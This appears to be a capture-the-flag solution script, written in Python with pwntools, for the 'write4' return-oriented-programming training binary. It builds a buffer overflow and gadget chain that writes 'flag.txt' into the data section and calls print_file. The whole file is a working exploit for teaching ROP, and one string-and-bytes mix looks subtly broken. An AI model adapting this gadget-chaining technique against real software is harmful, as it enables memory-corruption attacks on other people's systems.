#! /usr/bin/env python
from pwn import *

gadget1 = 0x0400690 # pop r14 ; pop r15 ; ret

gadget2 = 0x0400628 # mov qword ptr [r14], r15 ; ret

gadget3 = 0x0400693 # pop rdi ; ret

dataSect = 0x0601028 # data section address

print_file_plt = 0x400510 # plt address of print_file

payload = 'A'*40

r15 = b'flag.txt'

payload += p64(gadget1) + p64(dataSect) +r15 + p64(gadget2) # write string flag.txt to data section

payload += p64(gadget3) + p64(dataSect)  # store data section address to rdi register

payload += p64(print_file_plt) # jump to print_file

print(payload)

elf = ELF('./write4')

proc = elf.process()

proc.recvuntil('> ')

proc.sendline(payload)

proc.interactive()
